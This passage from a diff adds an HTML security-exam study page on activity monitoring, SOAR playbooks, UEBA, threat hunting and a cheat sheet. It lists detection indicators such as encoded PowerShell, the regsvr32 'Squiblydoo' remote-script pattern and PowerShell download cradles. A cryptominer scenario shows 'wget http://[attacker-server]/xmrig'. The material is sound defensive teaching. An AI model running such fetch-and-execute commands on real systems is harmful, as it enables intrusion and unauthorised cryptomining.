+  New admin account created at 3am
+  Scheduled task created by non-admin
+  Security group membership changed
+        </div>
+      </div>
+    </div>
+
+    <div class="activity-item">
+      <div class="activity-dot" style="background:var(--blue)"></div>
+      <div>
+        <div class="activity-title" style="color:var(--blue)">File and Data Access Activity</div>
+        <div class="activity-desc">Track access to sensitive files and data stores. Mass file access (ransomware scanning or exfil staging), access to sensitive directories by unusual accounts, bulk file downloads from SharePoint/file servers, file permission changes, sensitive data copied to removable media, database queries returning large result sets.</div>
+      </div>
+    </div>
+
+    <div class="activity-item">
+      <div class="activity-dot" style="background:var(--green)"></div>
+      <div>
+        <div class="activity-title" style="color:var(--green)">Process and Application Activity</div>
+        <div class="activity-desc">Monitor which processes run, parent-child relationships, command line arguments. Suspicious: Office app → PowerShell, browser → cmd.exe, script interpreters (Python, PowerShell) running encoded commands, process running from temp folder, process creating network connections that don't normally do so.</div>
+        <div class="code" style="font-size:0.65rem;margin-top:0.4rem">
+<span class="cr">HIGH FIDELITY attack indicators:</span>
+  winword.exe → powershell.exe (macro malware)
+  cmd.exe running from %TEMP% (dropped malware)
+  powershell.exe -enc [long base64] (encoded payload)
+  regsvr32.exe /s /n /u /i:http:// (Squiblydoo)
+  rundll32.exe executing suspicious DLL
+        </div>
+      </div>
+    </div>
+
+    <div class="activity-item">
+      <div class="activity-dot" style="background:var(--purple)"></div>
+      <div>
+        <div class="activity-title" style="color:var(--purple)">Network Connection Activity</div>
+        <div class="activity-desc">Every network connection is a potential data path. Monitor for: connections to known-bad destinations, beaconing behavior (connections at regular intervals = C2), unusual protocols or ports, internal systems connecting to internet directly (should go through proxy), DNS queries for newly registered or DGA domains, large outbound data transfers.</div>
+      </div>
+    </div>
+
+    <div class="activity-item">
+      <div class="activity-dot" style="background:var(--teal)"></div>
+      <div>
+        <div class="activity-title" style="color:var(--teal)">Cloud Resource Activity</div>
+        <div class="activity-desc">Cloud environments introduce new activities to monitor. API calls from unusual locations, resource creation/deletion at unusual times, IAM policy changes, S3 bucket permission changes (becoming public!), new root account activity, cost anomalies (cryptomining), unusual data egress charges, service quota changes.</div>
+        <div class="code" style="font-size:0.65rem;margin-top:0.4rem">
+AWS CloudTrail alert triggers:
+  Root account login (should NEVER be used daily)
+  New IAM admin created
+  S3 bucket ACL changed to public
+  Security group rule allows 0.0.0.0/0
+  CloudTrail logging disabled ← attacker covering tracks
+  KMS key deletion initiated
+        </div>
+      </div>
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// SCENARIO — Cryptominer Detected via Resource Monitoring</div>
+      <div class="code">
+<span class="cm"># Resource monitoring catches unauthorized cryptominer:</span>
+
+Monday 14:30 — Performance alert triggers:
+  Server: APP-PROD-07
+  CPU: <span class="cr">97% sustained (was 12% last week)</span>
+  Memory: 85% (was 45%)
+  Network out: <span class="cr">850 MB/hr (was 50 MB/hr)</span>
+
+SOC analyst investigates:
+  Remote process list: 
+    Legitimate: apache2, mysql, sshd, cron
+    Suspicious: <span class="cr">xmrig (known XMR cryptominer!)</span>
+  
+  Process origin:
+    xmrig started by: www-data (web user!)
+    Path: /tmp/.hidden_dir/xmrig
+    Started: Friday 23:41 (weekend — no one noticed)
+  
+  Timeline (from logs):
+    Friday 23:38: Web vulnerability exploited (command injection)
+    Friday 23:39: wget http://[attacker-server]/xmrig
+    Friday 23:41: xmrig started
+    Monday 14:30: Resource alert fires (3 days late!)
+
+<span class="cb">Response:</span>
+  xmrig process killed
+  Web vulnerability patched
+  Attacker's SSH key removed
+  Server rebuilt from clean image
+
+<span class="co">Lesson: Add real-time process monitoring, not just resource alerts</span>
+<span class="co">Resource alert came 3 days after compromise</span>
+<span class="cg">Process monitoring + EDR would have caught at minute 1 ✓</span>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// EXAM KEYWORDS</h4>
+      <div class="er"><span class="ek">CPU spike →</span><span>Cryptomining, malware, DoS — unexpected high CPU at off-hours especially</span></div>
+      <div class="er"><span class="ek">Mass file modification →</span><span>Ransomware encrypting files — high disk I/O + file rename pattern</span></div>
+      <div class="er"><span class="ek">Impossible travel →</span><span>Login from NY then UK 30 min later — account compromise indicator</span></div>
+      <div class="er"><span class="ek">Process spawning →</span><span>Word spawning PowerShell = macro malware — monitor parent/child relationships</span></div>
+      <div class="er"><span class="ek">Beaconing →</span><span>Regular connection intervals = C2 malware calling home</span></div>
+      <div class="er"><span class="ek">Audit policy disabled →</span><span>Attacker covering tracks — CRITICAL alert</span></div>
+      <div class="er"><span class="ek">Cloud root account →</span><span>Root/global admin login should trigger immediate alert — never used daily</span></div>
+      <div class="er"><span class="ek">CloudTrail disabled →</span><span>Attacker hiding their AWS activity — critical alert</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 8. SOAR & AUTOMATION      -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s8">
+<div class="card">
+  <div class="card-hd"><span class="card-num">08</span><span class="card-title">SOAR & Security Automation</span><span class="bdg bdg-indigo">Orchestrate · Automate · Respond</span></div>
+  <div class="card-bd">
+    <p>SOAR — <strong style="color:var(--text)">Security Orchestration, Automation, and Response</strong> — automates repetitive security tasks and response actions so analysts can focus on complex investigations. Turns hours of manual response into seconds of automated action.</p>
+
+    <h3>What SOAR Does</h3>
+    <div class="code">
+<span class="cm"># Manual response vs SOAR response:</span>
+
+<span class="cr">Manual response to phishing alert:</span>
+  Analyst receives alert: 09:14
+  Analyst reviews email: 09:19 (5 min)
+  Analyst checks URL in sandbox: 09:23 (4 min)
+  Analyst blocks URL on proxy: 09:27 (4 min)
+  Analyst checks who else received it: 09:35 (8 min)
+  Analyst notifies IT to quarantine emails: 09:41 (6 min)
+  Analyst creates ticket: 09:47 (6 min)
+  Total: <span class="cr">33 minutes — one analyst</span>
+
+<span class="cg">SOAR automated response to same phishing alert:</span>
+  Alert received: 09:14:00
+  SOAR triggered: 09:14:00
+  URL reputation checked (VirusTotal API): 09:14:02
+  URL blocked on all proxies: 09:14:03
+  All recipients identified (email API): 09:14:04
+  All copies quarantined (Exchange API): 09:14:05
+  Ticket created with full context: 09:14:06
+  Analyst notified with summary: 09:14:07
+  Total: <span class="cg">7 seconds — zero analyst time</span>
+
+Analyst reviews summary → closes ticket or escalates
+Analyst time saved: 32+ minutes for complex work
+    </div>
+
+    <h3>SOAR Playbooks — Automated Response Workflows</h3>
+
+    <div class="tool-card">
+      <div class="tool-hd"><span class="tool-icon">🎣</span><span class="tool-name">Phishing Playbook</span><span class="tool-type">Automated</span></div>
+      <div class="tool-desc">Triggered when phishing email reported or detected.</div>
+      <div class="code" style="font-size:0.65rem">
+1. Extract: sender, URLs, attachments from email
+2. Check: URL reputation (VirusTotal, URLscan.io)
+3. Check: attachment hash against threat intel
+4. If malicious:
+   → Block sender domain on email gateway
+   → Block URL on web proxy
+   → Quarantine all copies in organization
+   → Notify recipients (awareness email)
+   → Create incident ticket
+5. If suspicious (unknown):
+   → Detonate attachment in sandbox
+   → Analyst review required
+6. Document all actions in ticket automatically
+      </div>
+    </div>
+
+    <div class="tool-card">
+      <div class="tool-hd"><span class="tool-icon">🖥️</span><span class="tool-name">Compromised Endpoint Playbook</span><span class="tool-type">Automated + Manual</span></div>
+      <div class="tool-desc">Triggered when EDR detects malware or compromise on endpoint.</div>
+      <div class="code" style="font-size:0.65rem">
+1. Get asset details: owner, department, criticality
+2. Isolate endpoint from network (EDR API)
+3. Preserve memory dump and disk image
+4. Pull recent process, network, file activity
+5. Check: lateral movement from this host?
+   → If yes: isolate affected systems too
+6. Notify: asset owner, manager, security team
+7. Create P1 ticket with full context
+8. Assign to IR analyst for investigation
+9. Schedule: forensic analysis, reimaging
+      </div>
+    </div>
+
+    <div class="tool-card">
+      <div class="tool-hd"><span class="tool-icon">🔐</span><span class="tool-name">Suspicious Login Playbook</span><span class="tool-type">Automated</span></div>
+      <div class="tool-desc">Triggered on impossible travel, new country login, or multiple failed attempts followed by success.</div>
+      <div class="code" style="font-size:0.65rem">
+1. Get user details (AD, HR system)
+2. Get login history for comparison
+3. Check: is user actually traveling? (check Outlook calendar)
+4. Check: is VPN/proxy being used?
+5. Calculate: distance between last login and current
+6. If impossible travel (>500mph):
+   → Force MFA re-authentication
+   → If MFA fails: disable account
+   → Notify user and manager
+7. If genuine concern: disable account, notify
+8. Document investigation in ticket
+      </div>
+    </div>
+
+    <h3>SOAR Products</h3>
+    <div class="g3">
+      <div class="gc">
+        <h4 style="color:var(--blue)">Splunk SOAR (Phantom)</h4>
+        <p>Most widely deployed SOAR. Tight Splunk SIEM integration. Hundreds of pre-built app connectors. Visual playbook builder. Python-based for custom automation. Strong for large enterprises.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--teal)">Microsoft Sentinel (built-in)</h4>
+        <p>SOAR capabilities built into Sentinel SIEM. Logic Apps for workflow automation. Native Microsoft 365 and Azure integration. No separate SOAR product needed for Microsoft shops.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Palo Alto XSOAR (Demisto)</h4>
+        <p>Enterprise SOAR with strong threat intel integration. Collaborative investigation features — multiple analysts on same case. Good for MSSPs managing multiple clients.</p>
+      </div>
+    </div>
+
+    <h3>UEBA — User and Entity Behavior Analytics</h3>
+    <div class="code">
+<span class="cm"># UEBA uses ML to detect anomalies from individual baselines:</span>
+
+<span class="cb">Building user baseline (30-day learning period):</span>
+  User: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="305a5f585e1e435d59445870535f5d40515e491e535f5d">[email&#160;protected]</a>
+  Normal login times: Mon-Fri 8am-6pm
+  Normal location: New York (office), New Jersey (home)
+  Normal data access: Finance drive, shared documents
+  Normal download volume: ~200MB/day
+  Normal applications used: Office365, SAP, Salesforce
+
+<span class="cr">UEBA alert — deviation from baseline:</span>
+  Login: Sunday 2am (unusual time)
+  Location: Budapest, Hungary (new country)
+  Data access: HR drive, Legal drive (never accessed before)
+  Download: 4.7 GB (23x normal!)
+  Application: curl, wget, tar (never used before)
+
+<span class="cr">UEBA risk score: 94/100 (HIGH)</span>
+<span class="cr">Alert: "Account john.smith — high risk anomaly"</span>
+<span class="cm"># Could be: account compromise OR insider threat</span>
+<span class="cm"># Investigate: was John actually in Budapest?</span>
+    </div>
+
+    <h3>Threat Hunting — Proactive Monitoring</h3>
+    <div class="info-row">
+      <div class="info-icon">🔍</div>
+      <div>
+        <div class="info-title" style="color:var(--teal)">What Is Threat Hunting?</div>
+        <div class="info-desc">Proactive search for threats that have evaded automated detection. Hunters form hypotheses ("What if an attacker is using living-off-the-land techniques?") and manually search through data to find evidence. Finds the false negatives — attacks that slipped through all automated controls. Requires skilled analysts, good data, and time.</div>
+      </div>
+    </div>
+    <div class="code">
+<span class="cm"># Threat hunting example hypothesis:</span>
+"Are any attackers using PowerShell to live off the land?"
+
+Hunter searches SIEM/EDR for:
+  → PowerShell with -EncodedCommand flag
+  → PowerShell downloading from internet (IEX, WebClient)
+  → PowerShell running Base64-encoded commands
+  → PowerShell with unusual parent processes
+
+<span class="co">Finding 1:</span> 3 endpoints running encoded PowerShell at 2am
+<span class="co">Finding 2:</span> Command decodes to: download + execute from pastebin
+<span class="cr">Result: Active attacker found — not caught by automated detection</span>
+<span class="cg">IR initiated → attacker removed before escalation ✓</span>
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// SCENARIO — SOAR Handles 500 Alerts Overnight</div>
+      <div class="code">
+<span class="cm"># Overnight SOAR handles alert queue automatically:</span>
+
+<span class="cy">Total alerts overnight (10pm-8am): 847</span>
+
+<span class="cg">Auto-resolved by SOAR (no analyst needed): 789 alerts</span>
+  → 312 known vulnerability scanner traffic → auto-closed
+  → 247 IT automation scripts → auto-closed (known source)
+  → 145 expired certificate warnings → auto-ticketed for renewal
+  → 85 standard account lockouts → auto-unlocked (after verify)
+
+<span class="co">Escalated to analyst (need human review): 47 alerts</span>
+  → 23 medium-risk anomalies → analyst queue
+  → 18 cloud IAM changes → review in morning
+  → 6 suspicious logins → investigate
+
+<span class="cr">Analyst immediate response required: 11 alerts</span>
+  → 3 malware detections → analyst paged at 2am
+  → 5 successful logins from unusual countries → paged
+  → 3 C2 callback detections → paged
+
+<span class="cg">Result without SOAR:</span>
+  Analyst arrives 8am → 847 alerts backlog
+  Alert fatigue guaranteed
+  Overnight attacks: unresponded for 10 hours
+
+<span class="cg">Result with SOAR:</span>
+  Only 11 critical alerts required overnight response
+  789 auto-resolved → clean queue
+  Analyst focused on what matters ✓
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// EXAM KEYWORDS</h4>
+      <div class="er"><span class="ek">SOAR →</span><span>Security Orchestration, Automation, and Response — automates repetitive tasks</span></div>
+      <div class="er"><span class="ek">Playbook →</span><span>Automated workflow for specific alert type — phishing, malware, login anomaly</span></div>
+      <div class="er"><span class="ek">UEBA →</span><span>User behavior analytics — ML-based baseline deviation detection — insider threats</span></div>
+      <div class="er"><span class="ek">Threat hunting →</span><span>Proactive search for threats that evaded automated detection — finds false negatives</span></div>
+      <div class="er"><span class="ek">SOAR benefit →</span><span>Reduces response time from hours to seconds, reduces alert fatigue</span></div>
+      <div class="er"><span class="ek">Splunk SOAR →</span><span>Most widely deployed SOAR platform — formerly Phantom</span></div>
+      <div class="er"><span class="ek">Orchestration →</span><span>Connecting multiple security tools together to work as a system</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 9. SUMMARY                -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s9">
+<div class="card">
+  <div class="card-hd"><span class="card-num">09</span><span class="card-title">Complete Summary — Exam Cheat Sheet</span><span class="bdg bdg-teal">All Topics</span></div>
+  <div class="card-bd">
+
+    <h3>Monitoring Tools Quick Reference</h3>
+    <div style="overflow-x:auto;margin-bottom:1.5rem">
+    <table>
+      <tr><th>Tool</th><th>What It Does</th><th>Key Products</th><th>Exam Keyword</th></tr>
+      <tr><td><span class="tag tb">SIEM</span></td><td>Central log collection + correlation</td><td>Splunk, Sentinel, QRadar</td><td>Correlation across sources</td></tr>
+      <tr><td><span class="tag tg">EDR</span></td><td>Endpoint behavior monitoring + response</td><td>CrowdStrike, Defender, SentinelOne</td><td>Behavior-based, catches zero-days</td></tr>
+      <tr><td><span class="tag tp">XDR</span></td><td>Unified detection across all vectors</td><td>Cortex XDR, Defender XDR</td><td>Endpoint + network + cloud + email</td></tr>
+      <tr><td><span class="tag to">MDR</span></td><td>Outsourced 24/7 SOC + tools</td><td>Arctic Wolf, CrowdStrike Complete</td><td>Managed service — no internal SOC needed</td></tr>
+      <tr><td><span class="tag tt">NDR</span></td><td>Network anomaly detection</td><td>Darktrace, ExtraHop, Vectra</td><td>Detects C2 in encrypted traffic</td></tr>
+      <tr><td><span class="tag ti">SOAR</span></td><td>Automate alert response</td><td>Splunk SOAR, Sentinel, XSOAR</td><td>Playbooks, seconds not hours</td></tr>
+      <tr><td><span class="tag tp">UEBA</span></td><td>User behavior analytics</td><td>Exabeam, Splunk UBA</td><td>Baseline deviation, insider threats</td></tr>
+      <tr><td><span class="tag tc">NetFlow</span></td><td>Network traffic metadata</td><td>SolarWinds NTA, ntopng</td><td>Who talked to whom, how much</td></tr>
+    </table>
+    </div>
+
+    <h3>Log Ports & Protocols</h3>
+    <div style="overflow-x:auto;margin-bottom:1.5rem">
+    <table>
+      <tr><th>Protocol</th><th>Port</th><th>Security</th><th>Use</th></tr>
+      <tr><td>Syslog</td><td>UDP 514</td><td><span class="tag tr">Insecure</span></td><td>Legacy log forwarding — use only on trusted segments</td></tr>
+      <tr><td>Syslog-TLS</td><td>TCP 6514</td><td><span class="tag tg">Secure</span></td><td>Encrypted log forwarding — preferred</td></tr>
+      <tr><td>NTP</td><td>UDP 123</td><td>Medium</td><td>Time synchronization — critical for log correlation</td></tr>
+      <tr><td>SNMP v1/v2</td><td>UDP 161</td><td><span class="tag tr">Insecure</span></td><td>Device monitoring — community string = no real auth</td></tr>
+      <tr><td>SNMPv3</td><td>UDP 161</td><td><span class="tag tg">Secure</span></td><td>Encrypted + authenticated device monitoring</td></tr>
+    </table>
+    </div>
+
+    <h3>Scenario → Answer Cheat Sheet</h3>
+    <div class="exam" style="margin:0">
+      <h4>// EXAM SCENARIOS → ANSWERS</h4>
+      <div class="er"><span class="ek">"Central platform collecting logs from all sources"</span><span>→ SIEM (Splunk, Microsoft Sentinel, QRadar)</span></div>
+      <div class="er"><span class="ek">"Correlates events from multiple sources to find attacks"</span><span>→ SIEM correlation engine</span></div>
+      <div class="er"><span class="ek">"Endpoint monitoring — detects by behavior not signature"</span><span>→ EDR (CrowdStrike, Defender for Endpoint, SentinelOne)</span></div>
+      <div class="er"><span class="ek">"Catches zero-day malware with no signature"</span><span>→ EDR (behavioral) or Sandbox (detonation)</span></div>
+      <div class="er"><span class="ek">"Unified detection across endpoint + network + cloud"</span><span>→ XDR (Extended Detection and Response)</span></div>
+      <div class="er"><span class="ek">"Outsourced 24/7 security monitoring service"</span><span>→ MDR (Managed Detection and Response)</span></div>
+      <div class="er"><span class="ek">"Detects C2 traffic even in encrypted HTTPS"</span><span>→ NDR (Network Detection and Response) — metadata analysis</span></div>
+      <div class="er"><span class="ek">"Records who talked to whom, how much, when"</span><span>→ NetFlow / IPFIX — not packet content</span></div>
+      <div class="er"><span class="ek">"Full packet contents captured for investigation"</span><span>→ PCAP — Wireshark — high storage cost</span></div>
+      <div class="er"><span class="ek">"Detects rogue access points and evil twins"</span><span>→ WIDS (Wireless Intrusion Detection System)</span></div>
+      <div class="er"><span class="ek">"Encrypted log forwarding protocol"</span><span>→ Syslog over TLS — TCP port 6514</span></div>
+      <div class="er"><span class="ek">"Critical for correlating logs from different systems"</span><span>→ NTP (time synchronization) — UDP port 123</span></div>
+      <div class="er"><span class="ek">"Alert fired but no real threat exists"</span><span>→ False positive — causes alert fatigue</span></div>
+      <div class="er"><span class="ek">"Real attack — no alert generated"</span><span>→ False negative — WORST outcome</span></div>
+      <div class="er"><span class="ek">"Too many alerts — analysts ignore them"</span><span>→ Alert fatigue — tune rules, add context, automate</span></div>
+      <div class="er"><span class="ek">"Automate phishing response in seconds"</span><span>→ SOAR playbook</span></div>
+      <div class="er"><span class="ek">"ML detects user deviating from normal behavior"</span><span>→ UEBA (User and Entity Behavior Analytics)</span></div>
+      <div class="er"><span class="ek">"Proactive search for hidden attackers"</span><span>→ Threat hunting</span></div>
+      <div class="er"><span class="ek">"Login from New York then London 30 min later"</span><span>→ Impossible travel — account compromise indicator</span></div>
+      <div class="er"><span class="ek">"Sustained 95% CPU at 3am on server"</span><span>→ Cryptominer or malware — investigate immediately</span></div>
+      <div class="er"><span class="ek">"Word document spawning PowerShell process"</span><span>→ Macro malware — EDR behavioral detection</span></div>
+      <div class="er"><span class="ek">"Windows event ID 4625"</span><span>→ Failed logon — brute force detection</span></div>
+      <div class="er"><span class="ek">"Audit logging disabled"</span><span>→ Attacker covering tracks — critical alert</span></div>
+    </div>
+
+  </div>
+</div>
+</div>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+function go(id,btn){
+  document.querySelectorAll('.sec').forEach(s=>s.clas
